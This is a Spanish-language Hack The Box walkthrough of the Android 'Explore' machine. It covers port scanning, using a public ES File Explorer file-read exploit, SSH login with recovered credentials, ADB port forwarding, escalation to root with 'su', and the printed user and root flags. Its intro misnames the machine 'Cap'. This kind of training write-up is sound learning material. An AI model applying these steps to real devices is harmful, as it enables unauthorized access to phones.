---
title: Explore (Hack The Box)
author: J0lm3d0
date: 2021-10-30 21:00:00 +0200
categories: [HackTheBox]
tags: [android, esfe, es_file_explorer, adb, android_debugger_bridge]
pin: false
---

En este documento se recogen los pasos a seguir para la resolución de la máquina Cap de la plataforma HackTheBox. Se trata de una máquina Linux de 64 bits, que posee una dificultad fácil de resolución según la plataforma.

![Logo de la máquina](/assets/img/HTB/Explore/machine.png)

[Write-up en PDF realizado mediante LaTeX](/pdfs/Write_up_Explore.pdf)

## Enumeración de servicios y recopilación de información sensible

Lo primero a realizar es un escaneo de todo el rango de puertos TCP mediante la herramienta `Nmap`.

```
# nmap -p- --open -T5 -n -vv 10.10.10.247

Not shown: 65530 closed ports, 1 filtered port
Reason: 65530 resets and 1 no-response
PORT      STATE SERVICE      REASON
2222/tcp  open  EtherNetIP-1 syn-ack ttl 63
41147/tcp open  unknown      syn-ack ttl 63
42135/tcp open  unknown      syn-ack ttl 63
59777/tcp open  unknown      syn-ack ttl 63
```

Tras obtener los puertos que la máquina tiene abiertos, observo que se trata de puertos muy altos no estándar, por lo que aplico scripts básicos de enumeración y utilizo la flag -sV para intentar conocer la versión y servicio que están ejecutando cada uno de esos puertos.

```
# nmap -p2222,41147,42135,59777 -sC -sV 10.10.10.239

PORT      STATE SERVICE VERSION
2222/tcp  open  ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-SSH Server - Banana Studio
| ssh-hostkey: 
|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
41147/tcp open  unknown
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.0 400 Bad Request
|     Date: Thu, 12 Aug 2021 22:35:30 GMT
|     Content-Length: 22
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line:
|   GetRequest: 
|     HTTP/1.1 412 Precondition Failed
|     Date: Thu, 12 Aug 2021 22:35:30 GMT
|     Content-Length: 0
|   HTTPOptions: 
|     HTTP/1.0 501 Not Implemented
|     Date: Thu, 12 Aug 2021 22:35:35 GMT
|     Content-Length: 29
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Method not supported: OPTIONS
|   Help: 
|     HTTP/1.0 400 Bad Request
|     Date: Thu, 12 Aug 2021 22:35:51 GMT
|     Content-Length: 26
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: HELP
|   RTSPRequest: 
|     HTTP/1.0 400 Bad Request
|     Date: Thu, 12 Aug 2021 22:35:35 GMT
|     Content-Length: 39
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     valid protocol version: RTSP/1.0
|   SSLSessionReq: 
|     HTTP/1.0 400 Bad Request
|     Date: Thu, 12 Aug 2021 22:35:51 GMT
|     Content-Length: 73
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: 
|     ?G???,???`~?
|     ??{????w????<=?o?
|   TLSSessionReq: 
|     HTTP/1.0 400 Bad Request
|     Date: Thu, 12 Aug 2021 22:35:51 GMT
|     Content-Length: 71
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: 
|     ??random1random2random3random4
|   TerminalServerCookie: 
|     HTTP/1.0 400 Bad Request
|     Date: Thu, 12 Aug 2021 22:35:51 GMT
|     Content-Length: 54
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: 
|_    Cookie: mstshash=nmap
42135/tcp open  http    ES File Explorer Name Response httpd
|_http-title: Site doesn't have a title (text/html).
59777/tcp open  http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
|_http-title: Site doesn't have a title (text/plain).
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port2222-TCP:V=7.91%I=7%D=8/13%Time=6115BDA9%P=x86_64-pc-linux-gnu%r(NU
SF:LL,24,"SSH-2\.0-SSH\x20Server\x20-\x20Banana\x20Studio\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port41147-TCP:V=7.91%I=7%D=8/13%Time=6115BDA8%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,AA,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Thu,\x20
SF:12\x20Aug\x202021\x2022:35:30\x20GMT\r\nContent-Length:\x2022\r\nConten
SF:t-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\
SF:r\nInvalid\x20request\x20line:\x20")%r(GetRequest,5C,"HTTP/1\.1\x20412\
SF:x20Precondition\x20Failed\r\nDate:\x20Thu,\x2012\x20Aug\x202021\x2022:3
SF:5:30\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(HTTPOptions,B5,"HTTP/1\
SF:.0\x20501\x20Not\x20Implemented\r\nDate:\x20Thu,\x2012\x20Aug\x202021\x
SF:2022:35:35\x20GMT\r\nContent-Length:\x2029\r\nContent-Type:\x20text/pla
SF:in;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nMethod\x20not\x2
SF:0supported:\x20OPTIONS")%r(RTSPRequest,BB,"HTTP/1\.0\x20400\x20Bad\x20R
SF:equest\r\nDate:\x20Thu,\x2012\x20Aug\x202021\x2022:35:35\x20GMT\r\nCont
SF:ent-Length:\x2039\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r
SF:\nConnection:\x20Close\r\n\r\nNot\x20a\x20valid\x20protocol\x20version:
SF:\x20\x20RTSP/1\.0")%r(Help,AE,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDa
SF:te:\x20Thu,\x2012\x20Aug\x202021\x2022:35:51\x20GMT\r\nContent-Length:\
SF:x2026\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection
SF::\x20Close\r\n\r\nInvalid\x20request\x20line:\x20HELP")%r(SSLSessionReq
SF:,DD,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Thu,\x2012\x20Aug\x
SF:202021\x2022:35:51\x20GMT\r\nContent-Length:\x2073\r\nContent-Type:\x20
SF:text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nInvalid\
SF:x20request\x20line:\x20\x16\x03\0\0S\x01\0\0O\x03\0\?G\?\?\?,\?\?\?`~\?
SF:\0\?\?{\?\?\?\?w\?\?\?\?<=\?o\?\x10n\0\0\(\0\x16\0\x13\0")%r(TerminalSe
SF:rverCookie,CA,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Thu,\x201
SF:2\x20Aug\x202021\x2022:35:51\x20GMT\r\nContent-Length:\x2054\r\nContent
SF:-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r
SF:\nInvalid\x20request\x20line:\x20\x03\0\0\*%\?\0\0\0\0\0Cookie:\x20msts
SF:hash=nmap")%r(TLSSessionReq,DB,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nD
SF:ate:\x20Thu,\x2012\x20Aug\x202021\x2022:35:51\x20GMT\r\nContent-Length:
SF:\x2071\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnectio
SF:n:\x20Close\r\n\r\nInvalid\x20request\x20line:\x20\x16\x03\0\0i\x01\0\0
SF:e\x03\x03U\x1c\?\?random1random2random3random4\0\0\x0c\0/\0");
Service Info: Device: phone
```

Tras este segundo escaneo, veo que *Nmap* no ha conseguido detectar el servicio utilizado por el puerto 41147, mientras que detecta un servicio "ES File Explorer" en el puerto 42135 y una API para servidores de Minecraft en el puerto 59777, además de reconocer estos 2 últimos como un servicio HTTP, por lo que voy a intentar enumerar su contenido desde un navegador.

Al acceder al puerto 42135 obtengo un mensaje "Not Found" (no encontrado).

![Página principal del servicio HTTP del puerto 42135](/assets/img/HTB/Explore/42135index.png)

Por otra parte, al acceder desde el navegador al puerto 59777 me aparece un mensaje "FORBIDDEN" (prohibido).

![Página principal del servicio HTTP del puerto 59777](/assets/img/HTB/Explore/59777index.png)

Después de no conseguir ninguna información, pruebo a realizar un ataque de fuerza bruta para encontrar directorios y/o ficheros ocultos (fuzzing) mediante la herramienta `Gobuster`, sin obtener ningún resultado para el servicio del puerto 42135 y encontrando algunos directorios para el puerto 59777, aunque todos muestran un código 301 Forbidden.

```
# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.247:59777

/product              (Status: 301) [Size: 71] [--> /product/]
/data                 (Status: 301) [Size: 65] [--> /data/]   
/d                    (Status: 301) [Size: 59] [--> /d/]      
/bin                  (Status: 301) [Size: 63] [--> /bin/]    
/storage              (Status: 301) [Size: 71] [--> /storage/]
/system               (Status: 301) [Size: 69] [--> /system/] 
/lib                  (Status: 301) [Size: 63] [--> /lib/]    
/dev                  (Status: 301) [Size: 63] [--> /dev/]    
/cache                (Status: 301) [Size: 67] [--> /cache/]  
/etc                  (Status: 301) [Size: 63] [--> /etc/]    
/vendor               (Status: 301) [Size: 69] [--> /vendor/] 
/config               (Status: 301) [Size: 69] [--> /config/] 
/oem                  (Status: 301) [Size: 63] [--> /oem/]
```

Tras no conseguir nada con lo que avanzar, intento buscar exploits con los servicios que enumeré en el segundo escaneo de *Nmap*. Del servicio "ES File Explorer" encuentro un exploit para la versión 4.1.9.7.4 que permite la lectura de archivos y, aunque no conozca la versión que se está empleando del servicio, merece la pena probar si es vulnerable.

```
# searchsploit ES File Explorer
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
ES File Explorer 4.1.9.7.4 - Arbitrary File Read                                                                                                                                                         | android/remote/50070.py
iOS iFileExplorer Free - Directory Traversal                                                                                                                                                             | ios/remote/16278.py
MetaProducts Offline Explorer 1.x - FileSystem Disclosure                                                                                                                                                | windows/remote/20488.txt
```

## Acceso a la máquina

Para ejecutar el exploit, hay que pasar como argumentos un comando ya predefinido por el creador y la IP del servidor. La lista de comandos que pueden utilizarse puede obtenerse abriendo el exploit y comprobando las primeras líneas.

![Uso del exploit](/assets/img/HTB/Explore/exploituse.png)

Para comprobar si el servidor es vulnerable, utilizo el comando "getDeviceInfo" y, efectivamente, se confirma que el servidor es vulnerable y obtenemos información. Además, veo también que es posible que exista un servidor FTP en el directorio "/sdcard" expuesto de forma local en el puerto 3721.

![Información del dispositivo](/assets/img/HTB/Explore/deviceinfo.png)

Comprobando las diferentes opciones, encuentro una imagen cuyo título es "creds" (credentials), por lo que procedo a descargarla y visualizar su contenido, que muestra la contraseña de un usuario "kristi".

![Descarga de la imagen "creds"](/assets/img/HTB/Explore/credspic.png)

![Contenido de la imagen "creds"](/assets/img/HTB/Explore/creds.png)

Por tanto, pruebo las credenciales con el servicio SSH del puerto 2222 que escaneamos anteriormente, y veo que accedo correctamente al dispositivo.

![Acceso al dispositivo](/assets/img/HTB/Explore/access.png)

Tras buscar por los diferentes directorios, consigo encontrar la flag de usuario no privilegiado en el directorio "sdcard":

```
:/sdcard $ cat user.txt      
                                                  
f32017174c7c7e8f50c6da52891ae250
```

## Escalada de privilegios

Enumerando el sistema en busca de vías potenciales para escalar privilegios, veo que el puerto 5555 está abierto de forma interna.

```
:/ $ netstat -natup | grep "LISTEN"                                            
tcp6       0      0 :::59777                :::*                    LISTEN      -
tcp6       0      0 ::ffff:10.10.10.2:38341 :::*                    LISTEN      -
tcp6       0      0 :::2222                 :::*                    LISTEN      3215/net.xnano.android.sshserver
tcp6       0      0 :::5555                 :::*                    LISTEN      -
tcp6       0      0 ::ffff:127.0.0.1:39383  :::*                    LISTEN      -
tcp6       0      0 :::42135                :::*                    LISTEN      -
```

Este puerto es utilizado por el servicio **ADB (Android Debug Bridge)**, que es el que nos permite conectar un dispositivo Android a un PC para así poder testear las aplicaciones que se desarrollan para dicha plataforma directamente en un terminal físico. Esta conexión puede realizarse por USB (que es el medio más común) y, como en este caso, por TCP. Al estar abierto el puerto solo de forma interna, no puedo conectarme directamente desde mi máquina, pero, al contar con credenciales de acceso mediante SSH, puedo aprovecharlo para realizar un *Local Port Forwarding* que asocie el puerto 5555 de mi máquina al de la víctima.

```
# ssh -l kristi -L 5555:localhost:5555 -p 2222 10.10.10.247
Password authentication
Password: 
:/ $

 netstat -natup | grep "LISTEN"
tcp        0      0 127.0.0.1:5555          0.0.0.0:*               LISTEN      23089/ssh           
tcp6       0      0 ::1:5555                :::*                    LISTEN      23089/ssh
```

Una vez realizado, las conexiones que se realicen al puerto 5555 de mi máquina, se estarán reenviando y tratando en el servicio de la víctima. Por tanto, procedo a utilizar la herramienta `adb` para conectarme al servicio y obtener una shell.

```
# adb connect localhost:5555
connected to localhost:5555

# adb devices
List of devices attached
emulator-5554   device
localhost:5555  deviceinfo

# adb -s localhost:5555 shell
x86_64:/ $ id
uid=2000(shell) gid=2000(shell) groups=2000(shell),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc),3011(uhid) context=u:r:shell:s0
```

Tras acceder de nuevo al dispositivo mediante ADB, compruebo que soy el usuario "shell". Es muy posible que el servicio ADB esté ejecutandose con privilegios, por lo que pruebo a realizar un cambio de usuario a root (`su root`) y veo que, efectivamente, me convierto en el usuario root. Con esto, busco la flag final en el sistema y la visualizo.

```
x86_64:/ $ su root
:/ # find / -name "root.txt" 2>/dev/null
/data/root.txt
1|:/ # cat /data/root.txt
f04fc82b6d49b41c9b08982be59338c5
```
